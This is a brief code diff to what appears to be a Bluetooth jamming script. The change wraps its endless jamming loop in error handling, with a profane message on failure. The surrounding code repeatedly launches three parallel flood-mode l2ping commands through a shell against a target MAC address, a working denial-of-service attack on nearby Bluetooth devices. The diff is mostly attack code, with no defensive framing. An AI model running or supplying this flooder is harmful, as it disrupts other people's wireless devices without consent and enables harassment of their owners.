@@ -12,7 +12,7 @@ time = 999
 
 a = True
 def endless_jamming():
-
+    try:
         while a:
             xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
             xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
@@ -20,7 +20,8 @@ def endless_jamming():
             subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-
+    except Exception as e:
+        print("fuck this world")
 
 def limited_jamming():
     global time
